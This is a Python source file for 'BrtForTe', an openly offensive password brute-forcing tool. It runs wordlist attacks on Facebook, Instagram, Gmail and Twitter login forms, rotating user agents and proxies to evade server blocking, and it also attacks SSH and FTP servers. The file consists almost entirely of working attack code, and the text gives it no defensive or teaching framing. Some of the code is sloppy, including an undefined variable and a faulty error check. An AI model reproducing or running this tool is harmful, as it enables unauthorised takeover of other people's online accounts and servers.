#!/usr/bin/python

#	 -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=- WELCOME TO BRTFORTE TOOL (^-^) -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-

###############################################################[+>]: Cecking all tool need :[<+]#######################################################
try:
   import optparse,socket,os,time,sys,subprocess,cookielib,random,hashlib
   import datetime
   import threading
   from ftplib import FTP
   from urllib2 import urlopen, Request, URLError, HTTPError,install_opener,build_opener,ProxyHandler
except:
      print("\n[!]:Some Modules is Not Found In your Python\n[*]:Please Update your Python")
      exit()
try:
   from Core.banner import banner
   from Core.examples import examples
   from Core import mechanize
   from Core import pxssh
   from Core.proxys import proxy
except:
       print("\n[!]:The [Core] Tool Folder Is Missing!!")
       exit()

#######################################################################################################################################################

###################################################### Choice Random user agent #######################################################################
def useragent():
    useragents = [
           'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/534.24 (KHTML, like Gecko) RockMelt/0.9.58.494 Chrome/11.0.696.71 Safari/534.24',
           'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.47 Safari/537.36',
           'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/15.0.874.54 Safari/535.2',
           'Opera/9.80 (J2ME/MIDP; Opera Mini/9.80 (S60; SymbOS; Opera Mobi/23.348; U; en) Presto/2.5.25 Version/10.54',
           'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.12 Safari/535.11',
           'Mozilla/5.0 (Windows NT 5.1) AppleWebKit/535.6 (KHTML, like Gecko) Chrome/16.0.897.0 Safari/535.6',
           'Mozilla/5.0 (X11; Linux x86_64; rv:17.0) Gecko/20121202 Firefox/17.0 Iceweasel/17.0.1']
    return random.choice(useragents)

useuser = useragent()
useuser2 = useuser
useuser3 = useuser2
useuser4 = useuser3
#######################################################################################################################################################

############# show time #############
				    #
mytime = datetime.datetime.now()    #
hour = mytime.hour		    #
min = mytime.minute		    #
sec = mytime.second                 #######
timenow = "{}:{}:{}".format(hour,min,sec) #
###########################################

############################## Random color ################################
									   #
cor = ['\033[95m', '\033[96m', '\033[92m','\033[93m','\033[91m','\033[0m'] #
colors = cor[random.randint(0,5)]					   #
									   #
############################################################################

#============== Checking internet connection! ===============#
							     #
server = "www.google.com"				     #
def check():						     #
  try:							     #
      s = socket.gethostbyname(server)			     #
      conn = socket.create_connection((s, 80), 2)	     #
      return True					     #
  except:						     #
	pass						     #
  return False						     #
check1 = check()					     #
check2 = check1						     #
check3 = check2						     #
check4 = check3						     #
check5 = check4						     #
check6 = check5						     #
check7 = check6						     #
check8 = check7						     #
##############################################################

#:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::: ERRORS :::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
def msgerrorconnect():
  print(cor[3]+"\n[!]Ops:"+cor[5]+" Your Not Connected To The "+cor[4]+"[ Internet ]"+cor[2]+"\n[*]:"+cor[3]+"Please Connect To The Internet and try again :)")
  exit()

def passnotfound(x):
	       print(cor[3] + "\n[!]:"+cor[5]+"Password Not Found In [ "+cor[4]+x+cor[5]+" ] Wordlist!\n"+cor[2]+"[*]:"+cor[3]+"Try Other Wordlist :)")
	       exit()
def serverblock(x):
	  print(cor[3]+"\n[!]:"+cor[5]+"Your Blooked from "+cor[4]+x+cor[5]+" webserver!\n"+cor[2]+"[*]:"+cor[3]+"If Your "+cor[4]+"[ Internet ]"+cor[3]+ "Is Good try ["+cor[4]+" -p"+cor[3]+" ] For Use Random [Proxy] For Bypass Blooked :)\n[!]:If Your"+cor[4]+"[ Internet ]"+cor[3]+"Is Slow Please Wait 5-10 munites and try again :) ")
	  os.system("service network-manager restart")
	  exit()

def servererror():
            print(cor[3]+"\n[!]:"+cor[5]+"Ops: Your Not Connected To The "+cor[4]+"[ Any Network ]"+cor[2]+"\n[*]:"+cor[3]+"Please Connect To Some Network and try again :)")
            exit()
def exceptkey():
  print(cor[4] + "\n[!]:"+cor[3]+"Stoping Attack.......")
  time.sleep(2)
  exit()

def errorfile(x):
	print(cor[3]+"\n[!]:Error The: [ "+cor[4]+x+cor[3]+" ] File Not Found!!")
	exit()
#####################################################################################################################################################
#-------------------------------------Tool version------------------------------------#
ver = cor[1]+"[*]:"+cor[5]+"BrtForTe Version:"+cor[4]+" ["+cor[3]+"1.2"+cor[4]+"]"    #
#-------------------------------------------------------------------------------------#
ve = "1.2"
proxy1 = proxy()
proxy2 = proxy1
proxy3 = proxy2
proxy4 = proxy3
proxy5 = proxy4
proxy6 = proxy5

#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ Make Tool Options @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
defaultbanner = colors + """\
________       _______________            ________      
___  __ )________  /___  ____/_______________  __/____  
__  __  |_  ___/  __/_  /_   _  __ \_  ___/_  /  _  _ \ 
_  /_/ /_  /   / /_ _  __/   / /_/ /  /   _  /   /  __/ 
/_____/ /_/    \__/ /_/      \____//_/    /_/    \___/
						     V"""+cor[5]+"["+cor[4]+ve+cor[5]+"]"
parse = optparse.OptionParser(colors + defaultbanner+ """\

Usage: python ./BrtForTe.py [options]

OPTIONS:

[1]:EMAILS:
	   -F <Target Email> -W <Wordlist>     ::> This Option For Brute Force Attack On [ FaceBoock Account ]

	   -I <Target User>  -L <Wordlist>     ::> This Option For Brute Force Attack On [ Instagram Account ]

	   -G <Target Email> -A <Wordlist>     ::> This Option For Brute Force Attack On [ Gmail Account ]

	   -T <Target User>  -C <Wordlist>     ::> This Option For Brute Force Attack On [ Twitter Account ]

	   -p --use-proxy		       ::> This Option For Use Proxy with all emails options,
					           For Bypass website Web Server Blocked the attack
---------------
[2]:SERVER:
	   -S <serverIP> -U <Username> -D <Wordlist>     ::> This Option For Brute Force Attack On [ SSH SERVER ]
	   -f <serverIP> -E <Username> -K <Wordlist>     ::> This Option For Brute Force Attack On [ FTP SERVER ]
---------------
[3]:HASH:
	   -M <multi Hash> -m <Wordlist>     ::> This Option For Brute Force Attack On[ MD5,sha1,sha224,sha256,sha384,sha512]
---------------
[4]:WEB:
	 -N <website>     ::> This Option For Find WebSite [ Control Panel ]<!>[using Default Links File]>Core/LINKS.txt
	 -n <links file>  ::> This Option For Input Custom links File with [ Find CP option ]
	 -a --proxy       ::> This options For Using proxy with [Find CP option]
+-----------------------------------------+
-u --update    ::> update BrtForTe Tool.
-e --examples  ::> Show Tool Examples.
-v --version   ::> show tool version.""",version=ver)
def Main():
######################################[1] Emails Brute Force Options ######################################
          grEmails = optparse.OptionGroup(parse,"EMAILS OPTIONS",
						"BRUTE FORCE ATTACK ON ALL EMAILS!")
#Facebook:
	  grEmails.add_option("-F","--facebook",dest="facebookT",type="string")
	  grEmails.add_option("-W","--Fwordlist",dest="facebookW",type="string")
#Instagram:
	  grEmails.add_option("-I","--instagram",dest="instagramT",type="string")
	  grEmails.add_option("-L","--Iwordlist",dest="instagramW",type="string")
#Gmail:
	  grEmails.add_option("-G","--gmail",dest="gmailT",type="string")
	  grEmails.add_option("-A","--Gwordlist",dest="gmailW",type="string")
#Twitter:
	  grEmails.add_option("-T","--twitter",dest="twitterT",type="string")
          grEmails.add_option("-C","--Twordlist",dest="twitterW",type="string")

#Use Random proxy with Emails brute Froce
	  grEmails.add_option("-p","--use-proxy",action='store_true',dest="proxy",default=False) 

######################################[2] SERVER Brute Force Options ######################################
	  grServer = optparse.OptionGroup(parse,"\nSERVER OPTION",
					       "BRUTE FORCE ATTACK ON SERVER!")
#SSH SERVER:

	  grServer.add_option("-S","--SHserver",dest="sshT",type="string")
	  grServer.add_option("-U","--SHuser",dest="sshU",type="string")
	  grServer.add_option("-D","--SHwordlist",dest="sshW",type="string")
#FTP SERVER:

	  grServer.add_option("-f","--FTserver",dest="ftpT",type="string")
	  grServer.add_option("-E","--FTuser",dest="ftpU",type="string")
	  grServer.add_option("-K","--FTwordlist",dest="ftpW",type="string")


######################################[3] Hash Brute Force Options ######################################
	  grHash = optparse.OptionGroup(parse,"\nHASH OPTIONS",
					     "Brute Force Attack On Hash")
#ALL HASH:
	  grHash.add_option("-M","--hash",dest="anyhash",type="string")
	  grHash.add_option("-m","--wordlist",dest="wl",type="string")

######################################[4] WEB Brute Force Options #####################################
	  grWeb = optparse.OptionGroup(parse,"\nWEB OPTIONS",
					    "Brute Force Attack On Web")
# Finder CP:
	  grWeb.add_option("-N","--website",dest="website",type="string")
	  grWeb.add_option("-n","--Links",dest="links",type="string")
	  grWeb.add_option("-a","--proxy",action='store_true',dest="proxyweb",default=False)


###################################### Other Options You Can Use ######################################

	  grOther = optparse.OptionGroup(parse,"\nOTHER OPTIONS",
					      "OTHER OPTION YOU CAN USE")

#ShowVersion:
	  grOther.add_option("-v",action='store_true',dest="ShowVersion",default=False)

#Update Tool:
	  grOther.add_option("-u","--update",action='store_true',dest="update",default=False)

#ShowExaplesTool:
          grOther.add_option("-e","--examples",action='store_true',dest="examples",default=False)


	  parse.add_option_group(grEmails)
	  parse.add_option_group(grServer)
	  parse.add_option_group(grHash)
	  parse.add_option_group(grWeb)
	  parse.add_option_group(grOther)
	  (options,args) = parse.parse_args()
	  def checklinks():
	    try:
		if options.links !=None:
			return True
	    except:
		  pass
	    return False

	  uselinks = checklinks()

	  def checkproxy():
	    try:
	       if options.proxy:
		   return True
	    except:
		  pass
	    return False
	  proxys = checkproxy()

	  def checkproxyWithWebSection():
            try:
		if options.proxyweb:
		      return True
	    except:
		  pass
	    return False

	  webproxy = checkproxyWithWebSection()

	  if options.ShowVersion:
		print(ver)
		exit()

	  elif options.examples:
		examples()

	  elif options.update:
		     global check1
		     if check1 == True:
		     		      def update():
					 	  updater = subprocess.check_output("git pull origin master", shell=True)
						  if "Already up-to-date." in updater:
					                return 1
						  elif "error" or "Error" in updater:
						         return -1
						  else:
						         return 0
		                      toollink = "https://github.com/Oseid/BrtForTe"
		                      print("\n[*]:Update in progress.....")
		                      time.sleep(2)
		                      if update() == 1:
				                     print(cor[2]+"\n[*]:"+cor[4]+"[BrtForTe]"+cor[5]+" is Already up-to-date.")
				                     exit()
		                      elif update() == -1:
				                        print(cor[3]+"\n[!]:"+cor[4]+"[BrtForTe]"+cor[5]+" experienced an error while updating, please download manually from:"+cor[2]+" [ {} ]".format(toolink))
				                        exit()
	                              elif update() == 0:
			 	                       print(cor[2]+"\n[*]:"+cor[4]+"[BrtForTe]"+cor[5]+" has successfully updated to the latest version.")
			 	                       exit()
		                      else:
			                  pass
		                      exit()

		     elif check1 == False:
                                         msgerrorconnect()



#::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
#################################################### [1] SECTION BRUTFORCE EMAILS START ###############################################################
#::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::



#############################################################(1)FACEBOOK BRTFOR FUNCTION ##############################################################
#::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::

	  elif options.facebookT !=None and options.facebookW !=None:
		user = options.facebookT
		passw = options.facebookW
		global check2
		if check2 == True:
				 try:
				     passwfile = open(passw, "r")
				 except:
				       errorfile(passw)
			         if proxys == True:
					          prostatus = cor[2]+"ON"+cor[5]
						  prox = proxy1
				 else:
				     prostatus = cor[4]+"OFF"+cor[5]
				     prox = ""
			         banner()
				 time.sleep(1.5)
				 print(colors + "\n[+]:=================> CONFIG <=================:[+]\n"+cor[5])
				 print("[#]:Time         : [ "+str(timenow)+" ]")
				 print("[*]:Website      : [ www.facebook.com ]")
				 print("[+]:Target Email : [ "+str(user)+" ]")
				 print("[+]:Wordlist     : [ "+str(passw)+" ]")
				 print("[@]:Proxy status : [ "+prox+" ["+prostatus+"]")
				 print(cor[1]+"\n=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=")
				 time.sleep(1.5)
				 print(cor[4] +"\n[$]"+cor[2]+" <<<<<<<<<"+cor[4]+" Brute Force Attack Start"+cor[2]+" >>>>>>>>>"+cor[4]+" [$]\n")
				 lo = 1
			         for password in passwfile:
				 			  try:
							     br1=mechanize.Browser()
							     br1.set_handle_robots(False)
				                             br1.set_cookiejar(cookielib.LWPCookieJar())
				                             br1.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
							     if proxys == True:
								 br1.set_proxies({'http':prox})
							     else:
								  pass
							     global useuser
							     br1.addheaders =[("User-agent", useuser)]
							     op=br1.open("https://facebook.com")
							     dos1=open("Facebook-Log.txt","w+")
							     try:
						                 br1.select_form(nr=0)
							     except:
								   serverblock("[ www.facebook.com ]")
								   os.system("rm Facebook-Log.txt")
							     br1.form["email"]=user
							     br1.form["pass"]=password
							     br1.method="POST"
							     br1.submit()
						       	     dos1.write(br1.open("https://facebook.com").read())
							     dos1.seek(0)
							     text=dos1.read().decode("UTF-8")
							     if(text.find("home_icon",0,len(text))!=-1):
							   			                     print(cor[2] + "\n[*]:"+cor[5]+"Password Found "+cor[1]+" ==> "+cor[4]+ str(password))
												     time.sleep(0.60)
												     os.system("rm Facebook-Log.txt")
											             exit()
							     else:
							    	 print(cor[3] + '[!]:Trying Password[%s] : '%(lo) +cor[0]+ str(password) + "\n")
								 lo +=1
							  except KeyboardInterrupt:
									 os.system("rm Facebook-Log.txt")
									 exceptkey()


				 else:
				     os.system("rm Facebook-Log.txt")
				     passnotfound(passw)


		elif check2 == False:
				    msgerrorconnect()

#:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
########################################################## END FACEBOOK FUNCTION #####################################################################



#######################################################(2)INSTAGRAM BRTFOR FUNCTION ###################################################################
#::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::


	  elif options.instagramT !=None and options.instagramW !=None:
		    global check3
		    if check3 == True:
		                     username = options.instagramT
				     pwd_file = options.instagramW
				     try:
					passw = open(pwd_file, "r")
					passwords = passw.readlines()
				     except:
					   errorfile(pwd_file)
			             if proxys == True:
					              prostatus = cor[2]+"ON"+cor[5]
						      prox = proxy2
				     else:
				         prostatus = cor[4]+"OFF"+cor[5]
					 prox = ""
				     banner()
				     time.sleep(1.5)
				     print(colors + "\n[+]:=================> CONFIG <=================:[+]\n"+cor[5])
				     print("[#]:Time         : [ "+str(timenow)+" ]")
				     print("[*]:Website      : [ www.instagram.com ]")
				     print("[+]:Target User  : [ "+str(username)+" ]")
				     print("[+]:Wordlist     : [ "+str(pwd_file)+" ]")
				     print("[@]:Proxy status : [ "+prox+ "["+prostatus+"]")
				     print(cor[1]+"\n=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=")
				     time.sleep(1.5)
				     print(cor[4] +"\n[$]"+cor[2]+" <<<<<<<<<"+cor[4]+" Brute Force Attack Start"+cor[2]+" >>>>>>>>>"+cor[4]+" [$]\n")
				     def insta(password):
							global useuser2
                                                        br.addheaders =[("User-agent", useuser2)]
						        login = 'https://www.instagram.com/accounts/login/?force_classic_login'
    							br.open(login)
							try:
    							   br.select_form(nr=0)
							except:
							      serverblock("[ www.instagram.com ]")
    							br['username']=username
    							print(cor[3] + '[!]:Trying Password[%s] : '%(rs) +cor[0]+ str(password) + "\n")
    							br['password']=password
    							br.submit()
						        log = br.geturl()
   	 						if log !=login:
        							print(cor[2] + "\n[*]:"+cor[5]+"Password Found "+cor[1]+" ==> "+cor[4]+ str(password) + "\n")
        							sys.exit(0)
    						        else:
        				 		    return

				     br = mechanize.Browser()
				     br.set_handle_robots(False)
				     br.set_cookiejar(cookielib.LWPCookieJar())
				     br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
				     if proxys == True:
				     	 br.set_proxies({'http':prox})
				     else:
					 pass

				     rs = 1
				     try:
				        for i in range(len(passwords)):
    					 	passwords[i] = passwords[i].strip()
    					  	passwords[i] = passwords[i].replace('\n','')

					for password in passwords:
    					        insta(password)
					        rs +=1
                                        else:
				            passnotfound(pwd_file)


				     except KeyboardInterrupt:
							     exceptkey()
		    elif check3 == False:
				        msgerrorconnect()

#:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
########################################################## END INSTA FUNCTION ########################################################################




##########################################################(3)GMAIL BRTFOR FUNCTION ###################################################################
#:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::


	  elif options.gmailT !=None and options.gmailW !=None:
		    global check4
		    if check4 == True:
		                     email = options.gmailT
				     pwd_file = options.gmailW
	                             if email[-9:] !="gmail.com":
					   print(cor[3]+"\n[!]:"+cor[5]+"Please input just gmail email!\n"+cor[2]+"[*]:"+cor[3]+"example:> oseid@gmail.com")
					   exit()
				     try:
					list = open(pwd_file, "r")
					passwords = list.readlines()
				     except:
					   errorfile(pwd_file)
			             if proxys == True:
					              prostatus = cor[2]+"ON"+cor[5]
						      prox = proxy3
				     else:
				         prostatus = cor[4]+"OFF"+cor[5]
					 prox = ""
				     banner()
				     time.sleep(1.5)
				     print(colors + "\n[+]:=================> CONFIG <=================:[+]\n"+cor[5])
				     print("[#]:Time         : [ "+str(timenow)+" ]")
				     print("[*]:Website      : [ www.gmail.com ]")
				     print("[+]:Target Email : [ "+str(email)+" ]")
				     print("[+]:Wordlist     : [ "+str(pwd_file)+" ]")
				     print("[@]:Proxy status : [ "+prox+ "["+prostatus+"]")
				     print(cor[1]+"\n=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=")
				     time.sleep(1.5)
				     print(cor[4] +"\n[$]"+cor[2]+" <<<<<<<<<"+cor[4]+" Brute Force Attack Start"+cor[2]+" >>>>>>>>>"+cor[4]+" [$]\n")
				     def start(password):
							global useuser3
                                                        br.addheaders =[("User-agent", useuser3)]
    							br.open("https://www.gmail.com")
							try:
    							   br.select_form(nr=0)
							except:
							      serverblock("[ www.gmail.com ]")
    							br['Email']=email
    							br.submit()
							try:
    							   br.select_form(nr=0)
							except:
							      serverblock("[ www.gmail.com ]")
    							print(cor[3] + '[!]:Trying Password[%s] : '%(rs) +cor[0]+ str(password) + "\n")
    							br['Passwd']=password
    							br.submit()
   	 						if br.geturl()=='https://mail.google.com/mail/u/0/':
        							print(cor[2] + "\n[*]:"+cor[5]+"Password Found "+cor[1]+" ==> "+cor[4]+ str(password) + "\n")
        							sys.exit(0)
    						        else:
        				 		    return

				     br = mechanize.Browser()
				     br.set_handle_robots(False)
				     br.set_cookiejar(cookielib.LWPCookieJar())
				     br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
				     if proxys == True:
				     	 br.set_proxies({'http':prox})
				     else:
					 pass

				     rs = 1
				     try:
				        for i in range(len(passwords)):
    					 	passwords[i] = passwords[i].strip()
    					  	passwords[i] = passwords[i].replace('\n','')

					for password in passwords:
    					        start(password)
					        rs +=1
                                        else:
				            passnotfound(pwd_file)


				     except KeyboardInterrupt:
							     exceptkey()
		    elif check4 == False:
				        msgerrorconnect()

#::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
########################################################## END GMAIL FUNCTION #########################################################################


##########################################################(4)TWITTER BRTFOR FUNCTION ##################################################################
#::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::

	  elif options.twitterT !=None and options.twitterW !=None:
		    global check5
		    if check5 == True:
		                     email = options.twitterT
				     pwd_file = options.twitterW
				     try:
					list = open(pwd_file, "r")
					passwords = list.readlines()
				     except:
					   errorfile(pwd_file)
			             if proxys == True:
					              prostatus = cor[2]+"ON"+cor[5]
						      prox = proxy4
				     else:
				         prostatus = cor[4]+"OFF"+cor[5]
					 prox = ""
				     banner()
				     time.sleep(1.5)
				     print(colors + "\n[+]:=================> CONFIG <=================:[+]\n"+cor[5])
				     print("[#]:Time         : [ "+str(timenow)+" ]")
				     print("[*]:Website      : [ www.twitter.com ]")
				     print("[+]:Target User  : [ "+str(email)+" ]")
				     print("[+]:Wordlist     : [ "+str(pwd_file)+" ]")
				     print("[@]:Proxy status : [ "+prox+ "["+prostatus+"]")
				     print(cor[1]+"\n=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=")
				     time.sleep(1.5)
				     print(cor[4] +"\n[$]"+cor[2]+" <<<<<<<<<"+cor[4]+" Brute Force Attack Start"+cor[2]+" >>>>>>>>>"+cor[4]+" [$]\n")
				     def start(password):
							global useuser2
                                                        br.addheaders =[("User-agent", useuser4)]
    							br.open('https://m.twitter.com/login/')
							try:
    							   br.select_form(nr=1)
							except:
							      serverblock("[ www.twitter.com ]")
    							br['session[username_or_email]']= email
    							print(cor[3] + '[!]:Trying Password[%s] : '%(rs) +cor[0]+ str(password) + "\n")
    							br['session[password]'] = password
    							br.submit()
   	 						log = br.open('https://m.twitter.com/account').read()
							if email in log:
        							print(cor[2] + "\n[*]:"+cor[5]+"Password Found "+cor[1]+" ==> "+cor[4]+ str(password) + "\n")
        							sys.exit(0)
    						        else:
        				 		    return

				     br = mechanize.Browser()
				     cookies = cookielib.LWPCookieJar()
				     br.set_cookiejar(cookies)
				     br.set_handle_equiv(True)
				     br.set_handle_redirect(True)
				     br.set_handle_referer(True)
				     br.set_handle_robots(False)
				     br.set_debug_http(False)
			             br.set_debug_responses(False)
				     br.set_debug_redirects(False)
				     br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time = 1)
				     if proxys == True:
				     	 br.set_proxies({'http':prox})
				     else:
					 pass

				     rs = 1
				     try:
				        for i in range(len(passwords)):
    					 	passwords[i] = passwords[i].strip()
    					  	passwords[i] = passwords[i].replace('\n','')

					for password in passwords:
    					        start(password)
					        rs +=1
                                        else:
				            passnotfound(pwd_file)


				     except KeyboardInterrupt:
							     exceptkey()
		    elif check5 == False:
				        msgerrorconnect()




#::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
########################################################## END TWITTER FUNCTION #######################################################################


#::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
######################################################## (END)[1] EMAILIS SECTION #####################################################################
#::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::










#::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
#################################################### [2] SECTION BRUTFORCE SERVER START ###############################################################
#::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::




##########################################################(1)SSH SERVER FUNCTION ######################################################################
#::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::

	  elif options.sshT !=None and options.sshU !=None and options.sshW !=None:
		host = options.sshT
		user = options.sshU
		passf = options.sshW
		try:
		   infile = open(passf, "r")
	        except:
		      errorfile(passf)
		global check6
		if host == "127.0.0.1":
			check6 = True

		if check6 == True:
			         def checkport():
		                   try:
		     		      s = socket.gethostbyname(host)
		     		      conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		     		      conn.connect((s, 22))
		     		      return True
		  		   except:
					 pass
		  		   return False

				 if checkport() ==False:
			           print(cor[3]+"[!]Ops:"+cor[5]+"PORT"+cor[4]+" [ 22/SSH ]"+cor[3]+"IS CLOSE In Target Server\n[!]:I can't Continue Sorry :(")
			           exit()

				 def connect(host, user, password):
    				    global Found
				    Fails = 0
 				    try:
        			       s = pxssh.pxssh()
        			       s.login(host, user, password)
				       return s
    				    except Exception, e:
					   if Fails > 5:
	    					print("\n[!]Too Many Socket Timeouts")

				    	   elif 'read_nonblocking' in str(e):
	    			         	Fails += 1
                                         	time.sleep(5)
            				 	return connect(host, user, password)
				    	   elif 'synchronize with original prompt' in str(e):
	    				 	time.sleep(1)
	    				 	return connect(host, user, password)
				    	   return None
				 try:
				     banner()
				     time.sleep(1.5)
				     print(colors + "\n[+]:=================> CONFIG <=================:[+]\n"+cor[5])
				     print("[#]:Time         : [ "+str(timenow)+" ]")
				     print("[*]:Server       : [ SSH:%s ]"%(host))
				     print("[+]:Target User  : [ "+str(user)+" ]")
				     print("[+]:Wordlist     : [ "+str(passf)+" ]")
				     print(cor[1]+"\n=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=")
				     time.sleep(0.40)
				     print(cor[4] +"\n[$]"+cor[2]+" <<<<<<<<<"+cor[4]+" Brute Force Attack Start"+cor[2]+" >>>>>>>>>"+cor[4]+" [$]\n")
				     time.sleep(1.3)
				     rs = 1
                                     for line in infile:
                                       password = line.strip('\r\n')
	                               print(cor[3] + '[!]:Trying Password[%s] : '%(rs) +cor[0]+ str(password) + "\n")
				       rs +=1
                                       con = connect(host, user, password)
		                       if con:
		                          print(cor[2] + "\n[*]:"+cor[5]+"ServerSSH Crack!\n------------------------------"+cor[1]+"\n[*]:TargetINFO:\n"+cor[5]+"\n[*]:TIME : "+timenow+"\n[+]:TARGET SERVER : "+host+"\n[+]:TARGET USER : "+user+"\n[+]:Wordlist: "+passf+cor[2]+"\n\n[*]:"+cor[3]+"Target SSH Password ==> "+cor[1]+str(password)+cor[5]+"\n------------------------------")
				     else:
				         passnotfound(passf)

			         except KeyboardInterrupt:
					exceptkey()
		elif check6 == False:
				    servererror()
#::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
########################################################### END SSH FUNCTION ##########################################################################




###########################################################(2)FTP FUNCTION ############################################################################
#::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::

	  elif options.ftpT !=None and options.ftpU !=None and options.ftpW !=None:
		host = options.ftpT
		user = options.ftpU
		wl = options.ftpW
		global check7
		if host == "127.0.0.1":
			check7 = True

		if check7 ==True:
			def checkport():
		 	  try:
		     	     s = socket.gethostbyname(host)
		     	     conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		             conn.connect((s, 21))
		             return True
		          except:
			        pass
		          return False

		        if checkport() ==False:
			   print(cor[3]+"[!]Ops:"+cor[5]+"PORT"+cor[4]+" [ 21/FTP ]"+cor[3]+"IS CLOSE In Target Server\n[!]:I can't Continue Sorry :(")
			   exit()

		        try:
		           passin = open(wl, "r")
		        except:
 		              errorfile(wl)
			def ftp_brute(password):
			  try:
			    ftp = FTP(host)
			    ftp.login(user,password)
			    print(cor[2] + "\n[*]:"+cor[5]+"ServerFTP Crack!\n------------------------------"+cor[1]+"\n[*]:TargetINFO:\n"+cor[5]+"\n[*]:TIME : "+timenow+"\n[+]:TARGET SERVER : "+host+"\n[+]:TARGET USER : "+user+"\n[+]:Wordlist: "+wl+cor[2]+"\n\n[*]:"+cor[3]+"Target FTP Password ==> "+cor[1]+str(password)+cor[5]+"\n------------------------------")
			    exit(0)
			  except:
				pass
			try:
			    banner()
			    time.sleep(1.5)
			    print(colors + "\n[+]:=================> CONFIG <=================:[+]\n"+cor[5])
			    print("[#]:Time         : [ "+str(timenow)+" ]")
			    print("[*]:Server       : [ FTP:%s ]"%(host))
			    print("[+]:Target User  : [ "+str(user)+" ]")
			    print("[+]:Wordlist     : [ "+str(wl)+" ]")
			    print(cor[1]+"\n=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=")
			    time.sleep(0.40)
			    print(cor[4] +"\n[$]"+cor[2]+" <<<<<<<<<"+cor[4]+" Brute Force Attack Start"+cor[2]+" >>>>>>>>>"+cor[4]+" [$]\n")
			    time.sleep(1.3)
			    rs = 1
			    for line in passin:
					  password = line.strip('\r\n')
					  print(cor[3] + '[!]:Trying Password[%s] : '%(rs) +cor[0]+ str(password) + "\n")
					  rs += 1
					  t = threading.Thread(target=ftp_brute(password))
					  t.start()
			      		  time.sleep(0.2)
			    else:
				passnotfound(wl)

		        except KeyboardInterrupt:
						exceptkey()
		elif check7 == False:
                                    servererror()
#::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
########################################################### END FTP FUNCTION ##########################################################################





#::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
######################################################## (END)[2] SERVER SECTION ######################################################################
#::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::





